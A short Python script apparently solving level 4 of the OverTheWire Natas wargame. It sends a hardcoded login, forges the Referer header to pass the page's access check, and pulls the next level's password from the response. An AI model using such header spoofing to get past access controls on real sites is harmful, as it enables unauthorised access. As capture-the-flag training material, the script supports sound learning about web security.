#!/usr/bin/env python

import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = 'http://%s.natas.labs.overthewire.org/' % username

headers = {'referer': 'http://natas5.natas.labs.overthewire.org/'}
r = requests.get(url, auth=(username, password), headers=headers)

password = re.findall('(?<=natas5\sis\s)(.*)', r.text)[0]

print(password)